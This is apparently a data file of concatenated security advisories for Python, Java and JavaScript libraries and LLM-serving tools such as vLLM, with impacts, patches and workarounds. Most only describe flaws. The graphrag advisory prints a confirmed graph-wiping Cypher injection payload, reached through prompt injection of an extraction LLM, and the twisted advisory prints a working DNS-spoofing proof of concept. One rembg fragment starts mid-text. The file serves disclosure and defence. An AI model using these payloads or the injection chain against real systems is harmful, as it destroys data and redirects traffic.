### Summary

A flaw in dd-trace-py’s IAST instrumentation can cause the Python application process to terminate unexpectedly when processing certain attacker-controlled input. Only applications with IAST enabled are affected. IAST is disabled by default.

### Details

The affected IAST string-processing instrumentation does not properly handle certain internal errors, allowing an error to terminate the application process. Exploitation requires IAST to be enabled and application code to perform an affected string-processing operation on attacker-controlled input.

If you are unable to upgrade to a patched version of dd-trace-py, you can mitigate this issue by either disabling IAST (setting DD_IAST_ENABLED=false) or by replacing replace % string interpolations with str.format or f-strings for user inputs in your monitored application.

### Proof of concept

Detailed triggering inputs and reproduction steps are omitted from this advisory. The linked fix (#20786) includes regression coverage for the affected behavior.

### Impact

Denial of service affecting applications that use a vulnerable version of dd-trace-py with IAST enabled and expose the affected operation to attacker-controlled input. Successful exploitation terminates the affected Python process and interrupts the work it is handling.

### Impact
The C extension's BSON decoder scans a Regex element's pattern and flags strings with strlen before checking the document's remaining length, so a crafted truncated Regex element can read past the end of the caller's buffer. bson.decode and bson.decode_all accept mmap and array buffers, which carry no NUL sentinel; the read can cross into unmapped memory and kill the process with an uncatchable SIGSEGV. Any application decoding untrusted BSON from such buffers is affected — impact is availability only, since the out-of-bounds bytes are never returned as content. NUL-terminated buffers (bytes, bytearray) raise `InvalidBSON` at worst; the driver's own transport and pure-Python installs are not affected. All releases through 4.18.2 are affected when the C extension is loaded.

### Patches
Fixed in PyMongo 4.18.3. Malformed Regex elements now raise InvalidBSON on every accepted buffer type; valid documents decode unchanged.

###  Workarounds
Decode untrusted BSON only from NUL-terminated buffers — bytes or bytearray — and copy mmap input first, e.g. bytes(mm[:size]).

## Summary

An untrusted multimodal request can set `mm_processor_kwargs.code_revision`. When vLLM serves a model whose Hugging Face processor uses dynamic `auto_map` code and the operator enabled `--trust-remote-code`, this request value reaches `AutoProcessor.from_pretrained` and selects the Python revision imported by Transformers.

This lets a client replace the operator-reviewed processor module with code from another revision of the same model repository. The operator-selected model/data `revision` remains pinned; only the executed processor code changes.

Importing a Python module is arbitrary code execution in the vLLM API/renderer process. The PoC below demonstrates this with an import-time filesystem write. It is fully offline and does not require a GPU, model weights, or changes to a real Hub repository.

## Affected snapshot

- Repository: [`vllm-project/vllm`](https://github.com/vllm-project/vllm)
- Verified commit: [`570735520942b6428ae98f1eb442c6d88adae55e`](https://github.com/vllm-project/vllm/commit/570735520942b6428ae98f1eb442c6d88adae55e)
- Verified with Transformers 5.15.0 and 5.16.1
- Affected release range has not been bisected

## Affected configuration

The vulnerable path exists when all of the following are true:

1. The served model's processor uses dynamic `auto_map.AutoProcessor` code.
2. The operator enabled `trust_remote_code`.
3. The server can fetch the request-selected revision, or it is already cached.
4. The attacker can create or otherwise control a revision in the served model repository. An example is a [Hugging Face community pull-request ref](https://huggingface.co/docs/hub/en/repositories-pull-requests-discussions#where-in-the-git-repo-are-changes-stored) when that repository permits them.
5. A multimodal request reaches the processor path.

The default `trust_remote_code=False` configuration is not affected.

## Attack surface

`mm_processor_kwargs` is accepted directly by public request models:

- [`TokenizeChatRequest.mm_processor_kwargs`](https://github.com/vllm-project/vllm/blob/570735520942b6428ae98f1eb442c6d88adae55e/vllm/entrypoints/serve/tokenize/protocol.py#L111-L114)
- [`ChatCompletionRequest.mm_processor_kwargs`](https://github.com/vllm-project/vllm/blob/570735520942b6428ae98f1eb442c6d88adae55e/vllm/entrypoints/openai/chat_completion/protocol.py#L372-L375)

`/tokenize` is particularly relevant because vLLM's authentication middleware guards only `/v1`, `/v2`, `/inference`, and `/cohere` prefixes:

- [`AuthenticationMiddleware`](https://github.com/vllm-project/vllm/blob/570735520942b6428ae98f1eb442c6d88adae55e/vllm/entrypoints/serve/middleware/authenticate.py#L11-L62)

Consequently, `/tokenize` remains unauthenticated even when `--api-key` is configured, unless an external proxy protects it. The vLLM [Security Guide](https://docs.vllm.ai/en/latest/usage/security/#unprotected-endpoints-no-api-key-required) documents `/tokenize` as an unprotected endpoint.

## Root cause

The request value follows this path:

1. [`OnlineRenderer.preprocess_chat`](https://github.com/vllm-project/vllm/blob/570735520942b6428ae98f1eb442c6d88adae55e/vllm/renderers/online_renderer.py#L406-L435) places request `mm_processor_kwargs` in prompt extras.
2. Multimodal rendering forwards those kwargs into processor construction through [`MMProcessorInputs`](https://github.com/vllm-project/vllm/blob/570735520942b6428ae98f1eb442c6d88adae55e/vllm/renderers/base.py#L751-L760) and [`_process_multimodal_async`](https://github.com/vllm-project/vllm/blob/570735520942b6428ae98f1eb442c6d88adae55e/vllm/renderers/base.py#L831-L847).
3. [`MultiModalConfig.merge_mm_processor_kwargs`](https://github.com/vllm-project/vllm/blob/570735520942b6428ae98f1eb442c6d88adae55e/vllm/config/multimodal.py#L506-L518) overlays inference values on startup values, so the request wins.
4. [`cached_get_processor_without_dynamic_kwargs`](https://github.com/vllm-project/vllm/blob/570735520942b6428ae98f1eb442c6d88adae55e/vllm/transformers_utils/processor.py#L344-L375) filters only recognized processor-call keys. `code_revision` is retained as a processor-construction kwarg.
5. [`cached_processor_from_config`](https://github.com/vllm-project/vllm/blob/570735520942b6428ae98f1eb442c6d88adae55e/vllm/transformers_utils/processor.py#L380-L390) pins `revision` and `trust_remote_code`, but forwards the remaining kwargs without reserving `code_revision`.
6. [`get_processor`](https://github.com/vllm-project/vllm/blob/570735520942b6428ae98f1eb442c6d88adae55e/vllm/transformers_utils/processor.py#L205-L245) calls `AutoProcessor.from_pretrained(..., revision=revision, trust_remote_code=trust_remote_code, **kwargs)`.
7. Transformers [`AutoProcessor.from_pretrained`](https://github.com/huggingface/transformers/blob/v5.15.0/src/transformers/models/auto/processing_auto.py#L294-L302) uses `code_revision` to retrieve and import the dynamic module through [`get_class_from_dynamic_module`](https://github.com/huggingface/transformers/blob/v5.15.0/src/transformers/dynamic_module_utils.py#L474-L575), then removes it before loading processor data. This is why code comes from the attacker revision while configuration/data remain operator-pinned.

Request-time processor arguments are not separated from processor-construction arguments, and `code_revision` is not reserved.

## Suggested remediation

1. Separate processor-construction arguments from untrusted processor-call arguments. An allowlist of supported request-time preprocessing controls is safest.
2. Reject `code_revision` and other loader/source controls in request `mm_processor_kwargs`, and pass `model_config.code_revision` explicitly as the only permitted processor-code revision.
3. Add a regression test proving a request cannot change the loaded module revision while operator pins remain effective.
4. Protect `/tokenize` with the configured authentication policy as defense in depth.

Expected safe behavior is either a 4xx response for reserved request keys or silently ignoring them before processor construction. Rejection is preferable because it makes attempted misuse visible.

A patch for this was merged here: https://github.com/vllm-project/vllm/pull/58830

### Impact
`Snappy.arrayCopy(Object src, int offset, int byteLength, Object dest, int destOffset)` called a native `memcpy` without validating the ranges. A negative or oversized `byteLength` or offset read or wrote outside the arrays and crashed the JVM. `SnappyOutputStream.rawWrite` and `SnappyInputStream.rawRead`, and therefore the typed-array `write`/`read` methods, pass caller-supplied ranges to this method.

### Patches
Fixed in 1.1.10.9 (#741). `Snappy.arrayCopy` checks both ranges before copying. The stream `read`/`write` methods validate offsets and lengths, and reject typed-array ranges whose byte size overflows `int`.

### Workarounds
Validate offsets and lengths before calling these methods.

### Impact
Several decompression paths in snappy-java allocate an output buffer sized by the uncompressed length declared in the first bytes of the compressed data, before decompressing or validating it. A few bytes of crafted input can therefore force an allocation of up to 2 GB, causing `OutOfMemoryError` (denial of service), or a `NegativeArraySizeException` for declared lengths of 2^31 or more.

Affected entry points include `Snappy.uncompress(byte[])`, `Snappy.uncompressString`, the `Snappy.uncompress*Array` methods, `SnappyInputStream`, and `SnappyFramedInputStream`. The `maxChunkSize` limit added for CVE-2023-43642 bounds only the compressed chunk length, so it does not prevent this.

### Patches
Fixed in 1.1.10.9 (#739). `Snappy.uncompressedLength()` now rejects negative declared lengths, and lengths larger than any valid Snappy stream of the given size can produce. The densest Snappy element expands 3 bytes to 64, so the limit is 64/3 of the compressed size. Allocations are therefore proportional to the input actually received.

### Workarounds
Before decompressing untrusted data, check that `Snappy.uncompressedLength(input)` is within an application-specific limit.

cves.summary:
**Description**
def _escape(v: str) -> str:
    return str(v).replace("'", "\\'").replace("\\", "\\\\")
The escaping order is backwards, exactly like the classic HTML double-escape bug: step 1 inserts a literal backslash in front of every ', then step 2 re-matches that just-inserted backslash and doubles it. For an input ending in a single quote, the two steps combined produce \\' (two backslashes followed by the quote) in the output — which, under the standard backslash-escape convention used by Cypher/openCypher single-quoted string literals, is parsed as one escaped backslash followed by an unescaped, string-terminating quote. The quote is not neutralized; the string breaks open.

This escaped value is interpolated directly into Cypher query strings built by string formatting (not parameters) at 5 call sites in the same method:

self.lc_graph.query(
    f"MERGE (n:`{node.type}` {{id: '{_escape(node.id)}'}}) "
    f"{props}"
    f"RETURN distinct 'done' AS result"
)
...
self.lc_graph.query(
    f"MATCH (a:`{rel.source.type}` {{id: '{_escape(rel.source.id)}'}}), "
    f"(b:`{rel.target.type}` {{id: '{_escape(rel.target.id)}'}}) "
    f"MERGE (a)-[r:`{rel_type}`]->(b) "
    f"{props}"
    f"RETURN distinct 'done' AS result"
)
node.type, rel.source.type, rel.target.type and rel_type are also interpolated into backtick-quoted identifiers with no escaping at all.

Where the attacker-controlled data comes from: node/rel objects are LLM-extracted entities and relationships derived from ingested document content (the whole point of this GraphRAG pipeline). Document content is therefore untrusted input relative to this database layer — a classic indirect-prompt-injection-to-query-injection chain: craft a document whose text causes the extraction LLM to produce an entity id containing the payload below, ingest it, and the broken escape function turns it into live Cypher.

**Impact**
Full Cypher clause injection into lc_graph.query() calls that run with no query parameterization and no read-only restriction visible in this adapter. Demonstrated impact: appending a second clause (MATCH (m) DETACH DELETE m) to the query wipes every node and relationship in the graph in a single call. The same primitive can be adapted to exfiltrate data (e.g. RETURN other nodes' properties back through a field the caller reads) or tamper with existing records, depending on what the calling code surfaces to the end user/LLM.

Proof of Concept (executed, full query reconstruction)
Only the two-line _escape() function and the f-string template were executed — no import of the flexible-graphrag package itself.

raw attacker-controlled node.id:
"pwn' }) MATCH (m) DETACH DELETE m RETURN count(m) AS pwn //"
output of buggy _escape():
"pwn\\' }) MATCH (m) DETACH DELETE m RETURN count(m) AS pwn //"
full query string actually sent to lc_graph.query():
MERGE (n:`Entity` {id: 'pwn\\' }) MATCH (m) DETACH DELETE m RETURN count(m) AS pwn //'}) RETURN distinct 'done' AS result
Parse trace (standard backslash-escape convention for single-quoted Cypher strings):

Opening ' starts the id string literal.
pwn is consumed literally.
\\ (two backslash chars) is consumed as one escaped-backslash sequence — the string now holds one literal backslash.
The very next character is an unescaped ' — this closes the string literal early. id value ends up as "pwn\" (with a trailing backslash).
The remaining text }) MATCH (m) DETACH DELETE m RETURN count(m) AS pwn //... is now parsed as live Cypher syntax, not string content.
}) closes the property map and the node pattern — completing a valid MERGE clause.
MATCH (m) DETACH DELETE m RETURN count(m) AS pwn is a second, fully valid Cypher clause chained immediately after the MERGE (Cypher allows sequential clauses with no separator).
// starts a line comment, consuming the rest of the original template ('}) RETURN distinct 'done' AS result) so it never executes.
Effective query the database actually receives:

MERGE (n:`Entity` {id: 'pwn\'}) MATCH (m) DETACH DELETE m RETURN count(m) AS pwn
- a syntactically complete, two-clause Cypher statement that creates one throwaway node and then deletes the entire graph.

Suggested Fix
Escape \ before ' (fixes the ordering bug, same class of fix as the litellm report):
def _escape(v: str) -> str:
    return str(v).replace("\\", "\\\\").replace("'", "\\'")
Stronger fix, recommended in addition: use FalkorDB's parameterized query support (lc_graph.query(query, params={...})) instead of string interpolation entirely, and reject/escape backtick characters in node.type/rel_type/rel.source.type/rel.target.type before using them as label/relationship-type identifiers (these have no escaping at all today).
One caveat (same as original internal triage)
This was verified as a pure string-construction bug (steps 1-8 above are executed, not hypothesized) and confirmed against FalkorDB's Cypher-compatible documentation's stated backslash-escape convention for string literals, but was not run against a live FalkorDB instance to observe the parser's exact behavior byte-for-byte. If FalkorDB's dialect deviates from this convention, the specific PoC payload above may need minor adjustment — the underlying escape-ordering defect itself is confirmed either way.

Maintainer note: confirmed exploitable against a live FalkorDB. FalkorDB requires a WITH
between MERGE and MATCH, so the payload needs "WITH 1 AS x" added; with it, the payload
deleted every node in the graph. Fixed in 0.8.2: values are passed as query parameters and
labels/relationship types/property keys are stripped of backticks.

Affected configuration: GRAPH_BACKEND=langchain with GRAPH_DB=falkordb only. The LlamaIndex
FalkorDB store is not affected.

Workaround before upgrading: use GRAPH_BACKEND=llamaindex with FalkorDB, or another graph database.

cves.summary:
## Am I affected?

You may be affected if you use `better-auth` from `1.4.0-beta.18` through versions before `1.7.7` with the Magic Link plugin and social or Generic OAuth sign-in.

You are affected if **all** of these are true:

- Magic Link is enabled with default `storeToken: "plain"`, or with `storeToken: "hashed"` and global `verification.storeIdentifier: "hashed"` (including a hashed default).
- At least one built-in social provider or Generic OAuth provider is enabled.
- OAuth state uses `account.storeStateStrategy: "database"`, the default when a database or secondary storage is configured.

Cookie-backed state blocks this path, subject to the OAuth Proxy condition below. With custom hashers, confirm the flows cannot resolve to the same stored identifier.

## Summary

Better Auth accepts an OAuth sign-in state value as a Magic Link token. An attacker can start an OAuth sign-in with any email address and use the returned state value to finish a Magic Link sign-in for that address. They never prove that they can read that email.

## Impact

An unauthenticated attacker who knows a user's email address can get a normal session for that user, with all of that account's permissions. They need no access to the mailbox, and they do not need to sign in with the OAuth provider or complete an OAuth callback.

If Magic Link sign-up is enabled and no user has the email address, the attacker can instead create an account that Better Auth wrongly marks as email verified, and is signed in to it. The false verified-email flag can also bypass Better Auth's default unproven-account protections when the mailbox owner later signs in, leaving the attacker's session in that account. Applications that trust verified email addresses or email domains may give this account more access, depending on the application.

## Patches

The fix is merged for the planned `better-auth` 1.7.7 release. That package is not available yet.

Upgrade `better-auth` and installed Better Auth adapters, plugins, and integrations released alongside it together. Upgrade servers sharing verification storage in the same cutover. Request new Magic Links and restart pending OAuth or SAML sign-ins; links and state created before the upgrade cannot complete. Update custom `verification.storeIdentifier.overrides` rules to match the `magic-link:` and `auth-state:` prefixes. There is no user or account data migration, and public token values and API signatures are unchanged.

## Workarounds

Until you upgrade to the fixed release, use one of these mitigations:

- Set `account.storeStateStrategy` to `"cookie"`. If you also use OAuth Proxy, first configure one dedicated OAuth Proxy `secret` across all participating environments that differs from each environment's global Better Auth secret. Cookie-backed state can expose a separate OAuth Proxy account-takeover path when the proxy shares the global secret and implicit account linking is enabled.
- Set the Magic Link plugin option `storeToken` to `"hashed"` **and** leave global `verification.storeIdentifier` unset or set it to `"plain"`. Global identifier hashing does not prevent this issue when Magic Link tokens are also hashed.
- Turn off Magic Link sign-in, or turn off social and Generic OAuth sign-in.

Setting `disableSignUp: true` on the Magic Link plugin is not enough. It only stops the creation of new verified accounts. It does not stop the takeover of existing accounts.

### Summary

An authenticated user with `internal_user` privileges can escalate to `proxy_admin` and achieve remote code execution. The proxy uses one encryption key for two purposes: sealing secrets at rest and minting session tokens. An attacker exploits this by requesting a new API key with a crafted metadata field containing a forged admin credential as the "secret" value. The proxy encrypts and returns this payload. When this value is then presented as a bearer token, the proxy decrypts it, trusts the forged admin identity, and grants full administrative access, including the ability to execute arbitrary commands via the MCP stdio endpoint.

### Affected versions

Versions later than 1.91.0 are exploitable in the default configuration. Versions 1.87.0 through 1.90.x are exploitable only if `EXPERIMENTAL_UI_LOGIN=true` was explicitly set.

### Mitigation

Upgrade to a patched version as soon as possible.

If you cannot upgrade immediately, set `EXPERIMENTAL_UI_LOGIN=false`. This disables the vulnerable authentication path but also breaks CLI SSO and Claude Code gateway login.

### Impact

An internal user can escalate to proxy admin and execute arbitrary commands on the host.

**Discovery Credit:** Hoa X. Nguyen (OPSWAT Unit 515)

### Impact

The msgpack-python C extension (`msgpack._cmsgpack`) leaks a decoded map value when deserialization rejects a key with `strict_map_key=True` (the default). Repeated malformed inputs can cause unbounded process memory growth and denial of service in applications that deserialize attacker-controlled MessagePack data. Both `unpackb()` and the streaming `Unpacker` API are affected. The pure-Python fallback does not exhibit this leak in the reported tests.

The report measured approximately 4 MiB retained per failed parse and 100 MiB after 25 failed parses on Windows with Python 3.14 and msgpack 1.2.2. These are reporter-provided results.

### Additional impact: stale parser-stack references

The reference-ownership audit performed while fixing this leak found an
additional memory-safety issue in the streaming `Unpacker`.

After `unpack()` completed a nested container, an inactive parser-stack slot
could retain a non-owning pointer to the decoded object. A subsequent `skip()`
could reactivate that slot. If parsing then failed, context cleanup treated the
stale pointer as an owned reference and decremented it.

This corrupts the object's reference count and can result in a use-after-free
or double `Py_DECREF` when its actual owners later release it.

Although few users use this API, but those who do may experience crashes or unexpected errors due to a use-after-free.

### Details

In `msgpack/unpack.h`, `unpack_callback_map_item()` rejects keys that are neither `str` nor `bytes`. At this point the map value has already been constructed. The early error return does not release the value reference.

In `msgpack/unpack_template.h`, the value is held in the local `obj` in `unpack_execute()`. The `CT_MAP_VALUE` error path jumps to `_failed` without decrementing that reference. Cleanup of the parser stack does not recover the value because it is not stored in the stack. The fallback checks the key before decoding the value.

### Affected versions

The report reproduces the issue on **1.2.2** and reports it on development commit `475c1b7`. The affected-product field lists the reproduced release only; it is not a claim that earlier releases are unaffected.

The earliest affected release needs confirmation: the report's summary says 1.1.x through 1.2.2, while its root-cause analysis attributes introduction to commit `cd81370` (PR #673). Resolve this discrepancy before publishing a definitive affected-version range.

### Reproduction

Run in a disposable local process with the C extension installed:

```python
import msgpack

payload = msgpack.packb({42: b"A" * (4 * 1024 * 1024)}, use_bin_type=True)
msgpack.unpackb(payload)  # Raises ValueError; the report observes a 4 MiB leak.
```

Streaming API trigger:

```python
import msgpack

payload = msgpack.packb({42: b"A" * (4 * 1024 * 1024)}, use_bin_type=True)
u = msgpack.Unpacker()
u.feed(payload)
list(u)  # Same strict_map_key error path.
```

### Workarounds

The pure-Python fallback is reported not to leak on this path and may be used as a temporary workaround after application compatibility and performance checks. Request-size and rate limits may reduce the impact but do not eliminate cumulative leakage.

cves.summary:
### Impact

Since 2006 / pylint 0.15.2, pylint caches its stats as pickles in `PYLINT_HOME` and reload them on the next run with `pickle.load`. Someone without access to the configuration or linted code, but with access to the cache directory (predictable `PYLINT_HOME` on a multi-user host) can write a crafted pickle that will runs arbitrary code when pylint access its stat cache.

### Patches

From pylint 4.0.9, the result cache is now stored as JSON instead of pickle, preventing code-execution. 

### Workarounds

Until upgrading do not point `PYLINT_HOME` to an untrusted, shared, or group-writable directory. The default value, `~/.cache/pylint`, is writable only by the user running pylint.

### Credits

- Reported privately via Tidelift coordinated disclosure (Dan Lenz).

## Impact

Satori does not properly escape certain values before including them in generated SVG output. This can allow crafted values to be interpreted as SVG markup.

The impact depends on how the generated SVG is consumed.

## Workaround

No complete workaround exists besides upgrading. Applications that cannot immediately upgrade should not render attacker-controlled content with Satori.

cves.summary:
### Summary

When the `OffloadingConnector` uses `TieringOffloadingSpec` with a P2P secondary tier, an API client can submit many unique non-listening peer addresses through `kv_transfer_params.prefill`. vLLM keeps every never-established P2P session and its ZeroMQ sockets after the request finishes. On vLLM 0.26.0, 340 such peers filled the default ZeroMQ context socket quota; creating the next peer raised an uncaught `ZMQError`, terminated `EngineCore`, and shut down the API server. The path was reproduced with a normal API key and no access to the internal P2P listener.

### Details

#### Root cause

In vLLM 0.26.0, `P2PSecondaryTierManager.on_new_request()` reads the following request-controlled fields:

```json
{
  "kv_transfer_params": {
    "prefill": {
      "kv_request_id": "id",
      "remote_host": "127.0.0.1",
      "remote_port": 49101
    }
  }
}
```

`on_new_request()` calls `_get_or_create_session(peer_id)`. This calls `ZmqTransport.connect()`, creates a `P2PSession`, and stores it in `_sessions` before the asynchronous ZeroMQ connection has been established.

`ZmqTransport._open_connection()` creates a DEALER, enables a libzmq monitor, creates a PAIR socket for that monitor, calls `dealer.connect()`, and immediately stores the resulting `ZmqConnection` in `_connections`. Returning from `dealer.connect()` does not prove that the peer is reachable.

The monitor subscribes only to `zmq.EVENT_DISCONNECTED`. A peer that never accepts the initial connection produced `EVENT_CONNECT_DELAYED`, `EVENT_CONNECT_RETRIED`, and `EVENT_CLOSED`, but no `EVENT_DISCONNECTED` during a 60-second observation. The production monitor therefore never calls `mark_dead()`, and `ZmqConnection.alive` remains true.

Request completion calls `session.finish_request()`, but does not close or remove the peer session. The manager reaps only a session for which `session.connected and not session.alive` is true. A never-established peer remains `connected=True`, `alive=True`, and `ready=False`. There is no establishment deadline, idle eviction, or limit on pending or total peers.

Each unique retained peer uses about three sockets in the same ZeroMQ context: the DEALER, the monitor endpoint created by libzmq, and the PAIR monitor client. With the measured default `MAX_SOCKETS=1023`, 340 peers use approximately 1,020 sockets in addition to the local ROUTER. The next peer fails while creating its monitor PAIR. The exception escapes through `on_new_request()` and the scheduler into the EngineCore loop:

```text
P2PSecondaryTierManager._get_or_create_session()
  -> ZmqTransport.connect()
  -> ZmqTransport._open_connection()
  -> monitor_sock = self._zmq_ctx.socket(zmq.PAIR)
  -> zmq.error.ZMQError: Too many open files
  -> EngineDeadError
```

The process open-files limit was 65,536. The EngineCore had about 1,215 file descriptors at the failure point, so the failure was not the operating-system FD limit.

#### Boundary and controls

Each row below used a fresh vLLM process and pre-generated unique non-listening loopback ports.

| Test | Result |
|---|---|
| Default `MAX_SOCKETS=1023`, 340 unique peers | 340 HTTP 200 responses; 340 active peers; service healthy |
| Default limit, 344 unique peers, concurrency 4 | 340 HTTP 200 and 4 HTTP 500 responses; EngineCore and API exited |
| Default limit, 344 unique peers, concurrency 1 | Same 340-peer ceiling and service exit |
| Same endpoint repeated 512 times | 512 HTTP 200 responses; one active peer; service healthy |
| 512 requests without P2P parameters | 512 HTTP 200 responses; no active peers; service healthy |

A diagnostic A/B changed only the context `MAX_SOCKETS` value. Raising it from 1,023 to 2,048 moved the last fully successful point from 340 to 682 peers. The 683rd peer then raised the same `ZMQError` and terminated the service. The approximately 2.01x movement in the boundary identifies the ZeroMQ context quota as the exhausted resource.

The failure runs used logging-only instrumentation around `_open_connection()` to record the context limit, peer count, and process FD count. It did not add or close any ZeroMQ socket and re-raised the original exception.

#### Related public work

[PR #47843](https://github.com/vllm-project/vllm/pull/47843) is an open, unmerged proposal that identifies client-supplied P2P peer addresses as an SSRF risk and proposes API sanitization plus a configured peer allowlist. Those changes would block this public API trigger, but the PR does not add a connection deadline, session cleanup, or a capacity limit for never-established peers. This report adds the deterministic resource-exhaustion and service-exit impact of the retained state.

[PR #49823](https://github.com/vllm-project/vllm/pull/49823) fixes cleanup and reconnection after a connection has been marked dead. A peer that never establishes does not receive the subscribed `EVENT_DISCONNECTED` event, so it never enters that dead-state cleanup path.

### Impact

This is uncontrolled resource consumption leading to denial of service. An attacker needs network access to an OpenAI-compatible inference endpoint and a normal API key when `--api-key` is enabled. The attacker does not need access to the internal P2P control or data ports and does not need any peer to answer.

Only deployments that explicitly enable `OffloadingConnector`, `TieringOffloadingSpec`, and a P2P secondary tier are affected. Repeating a cheap one-token request with unique non-listening endpoints steadily consumes scheduler and ZeroMQ resources. In the tested default context, about 341 requests were enough to terminate EngineCore and stop all inference on the instance until restart. Confidentiality and integrity were not affected; the demonstrated impact is availability loss.

This advisory was fixed in [MR51504](https://github.com/vllm-project/vllm/pull/51504).

The models read the file as ONNX external data and encode its bytes into the returned PNG. This issue affects SAM's `sam_model` in 2.0.81 and returns complete file contents. *Screenshot 1 — First unauthenticated request primes the path and returns HTTP 500.* ### Technical details `rembg/commands/s_command.py:188-223,384-397` accepts public `extras` JSON and passes it to `new_session()`. `rembg/sessions/sam.py:313-355` inserts `sam_model` into encoder/decoder filenames and fixed GitHub URLs, then invokes `pooch.retrieve()` without a pinned hash. cves.summary:
### Summary

`twisted.names.dns.DNSDatagramProtocol`, the UDP transport used by twisted's DNS client (`twisted.names.client.Resolver`, `createResolver`, and anything built on it, including MX lookups in `twisted.mail`), accepts a DNS response for a pending query solely on the basis of the 16-bit transaction ID matching. It never checks that the response actually originated from the server the query was sent to. Any host that can deliver a UDP packet to the resolver's listening port with the correct transaction ID can inject a forged answer, independent of the real server's address. This is a materially weaker defense than standard DNS resolver practice (transaction ID plus source-address validation, typically also source-port rotation), and enables off-path DNS response spoofing / cache poisoning.

### Details

`DNSDatagramProtocol.datagramReceived` (`src/twisted/names/dns.py`, line 3350) is:

```python
def datagramReceived(self, data, addr):
    """
    Read a datagram, extract the message in it and trigger the associated
    Deferred.
    """
    m = Message()
    try:
        m.fromStr(data)
    except EOFError:
        ...
    except ValueError as ex:
        ...
    except BaseException:
        ...

    if m.id in self.liveMessages:
        d, canceller = self.liveMessages[m.id]
        del self.liveMessages[m.id]
        canceller.cancel()
        try:
            d.callback(m)
        except BaseException:
            log.err()
    else:
        if m.id not in self.resends:
            self.controller.messageReceived(m, self, addr)
```

The `addr` parameter, the UDP source address of the datagram, is accepted but never compared against the address the corresponding query was sent to. The only check is `m.id in self.liveMessages`, and `liveMessages` is keyed purely by the transaction ID chosen in `DNSMixin.pickID()`. The listening socket is a plain `listenUDP(0, self, maxPacketSize=512)` (line 3348), not connected to the queried server, so the kernel does not filter by source address either; any host can deliver a UDP datagram to this socket.

The transaction ID itself is generated with `secureRandom` (`randomSource()`, line 174), so it is not predictable, but at 16 bits it is a 1-in-65536 space per attempt. `twisted.names.client.Resolver`, the standard, documented DNS client, mitigates brute-force guessing of that space by creating a brand-new `DNSDatagramProtocol` bound to a fresh, independently random source port (`_connectedProtocol()`, `src/twisted/names/client.py` line 206, using `dns.randomSource()`) for every individual query, and tearing the socket down once the query completes (`_query()`, line 253). This gives an off-path attacker roughly 32 bits of combined entropy (port and transaction ID) to guess per query issued through the standard client, not just the 16 bits of the transaction ID alone.

The missing source-address check is still a real gap for two reasons. First, it removes a defense-in-depth backstop that DNS resolver best practice (RFC 5452) treats as independent from port and ID randomization; an attacker who is on-path, shares a broadcast domain or NAT with the resolver or the real DNS server, or is otherwise able to observe or narrow the ephemeral port faces no additional barrier at all, since source-address validation is exactly the check that would stop them. Second, `DNSDatagramProtocol` is itself a public, documented class; code that constructs one directly and issues more than one query against the same instance, rather than going through `client.Resolver`'s per-query protocol and port cycling, reuses the same source port for every query after the first, so guessing the 16-bit transaction ID alone is sufficient from that point on.

`twisted.names.client.Resolver` uses this same `DNSDatagramProtocol` class for every UDP query it issues, so every consumer of the standard twisted DNS client, including `twisted.mail`'s MX resolution, is subject to the same unauthenticated accept logic in `datagramReceived`, moderated by the per-query port rotation described above.

### PoC

```python
import socket
from twisted.internet import reactor
from twisted.names import dns

class CapturingController:
    def messageReceived(self, message, protocol, address):
        pass

def main():
    resolverProto = dns.DNSDatagramProtocol(CapturingController())
    resolverProto.startListening()

    real_server = ("203.0.113.1", 53)  # RFC 5737 TEST-NET-1, never answers
    query = dns.Query(b"victim.example.com", dns.A, dns.IN)
    d = resolverProto.query(real_server, [query], timeout=5)

    stolen_id = next(iter(resolverProto.liveMessages))
    resolver_port = resolverProto.transport.getHost().port

    forged = dns.Message(stolen_id, answer=1)
    forged.queries = [query]
    forged.answers = [
        dns.RRHeader(name=b"victim.example.com", type=dns.A, cls=dns.IN, ttl=60,
                     payload=dns.Record_A(address="6.6.6.6"))
    ]

    attacker_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    attacker_sock.bind(("127.0.0.1", 0))  # unrelated to real_server
    attacker_sock.sendto(forged.toStr(), ("127.0.0.1", resolver_port))

    def onResult(message):
        print("Resolver ACCEPTED forged response as the answer to its query to", real_server)
        print("Spoofed A record:", message.answers[0].payload.dottedQuad())
        reactor.stop()

    d.addCallback(onResult)

reactor.callWhenRunning(main)
reactor.run()
```

Output:

```
Resolver listening on 127.0.0.1:54997, queried ('203.0.113.1', 53), id=6995
Forged response sent from ('127.0.0.1', 53644) (NOT ('203.0.113.1', 53))
Resolver ACCEPTED forged response as the answer to its query to ('203.0.113.1', 53)
Spoofed A record: 6.6.6.6
```

The query was sent to `203.0.113.1:53`, an address reserved by RFC 5737 for documentation and testing that will never respond. The forged response was sent from an unrelated local UDP socket bound to a different, unrelated port. The resolver accepted it as the legitimate answer purely because the transaction ID matched, proving the response's source address plays no role in validation.
### Impact

Any application resolving hostnames through `twisted.names` can have DNS answers forged by a network party able to deliver a UDP packet to the resolver's listening port with the correct transaction ID, and, for the standard `client.Resolver` path, the correct ephemeral source port too. An on-path attacker, or one sharing a broadcast domain or NAT with the resolver or the real DNS server, faces no meaningful barrier at all, since source-address validation is exactly the check that would stop them and it is absent. An off-path attacker targeting the standard `client.Resolver` API must win a roughly 32-bit combined guess (port and transaction ID) within the query timeout window; the same attacker targeting code that uses the public `DNSDatagramProtocol` class directly across multiple queries on one instance, a supported usage pattern, faces only the 16-bit transaction ID space per query after the first. A successful forgery lets an attacker redirect hostname resolution to an address of their choosing, enabling mail interception (spoofed MX/A records), SSRF, or man-in-the-middle positioning against anything that trusts the resolved address.

### Impact

An input validation issue allowed members to delete comment likes / dislikes that they were not authorized to delete.

### Vulnerable versions

This vulnerability is present in Ghost from v5.9.0 up to v6.44.1.

### Patches

v6.44.1 contains a fix for this issue.

### How to update

For self-hosters using Docker, find [Docker's official Ghost image here](https://hub.docker.com/_/ghost). Updating a Docker-based Ghost instance [is documented here](https://docs.ghost.org/install/docker#updating-ghost).

If your Ghost is a Ghost-CLI install see our documentation on [updating it to the latest version here](https://docs.ghost.org/update).

### References

Ghost thanks [Adel Assakaf](https://github.com/assakafpix) and [Arthur Gurunlian](https://github.com/Buggs777) as well as Geoffrey Diederichs of [Escape](https://escape.tech/) for disclosing this vulnerability responsibly.

If you have any questions or comments about this advisory, email us at [security@ghost.org](mailto:security@ghost.org).

## Summary

`kernel/mcp/tools/file.go`'s `resolvePath()` includes an explicit comment stating its
sensitive-path blocklist is meant to align with the HTTP file API's established blacklist
(`refuseToAccess()` in `kernel/api/file.go`), following the remediation for GHSA-cvhv-7xhj-xjp8
("Unauthenticated Administrator takeover exfiltrated via the MCP"), which specifically
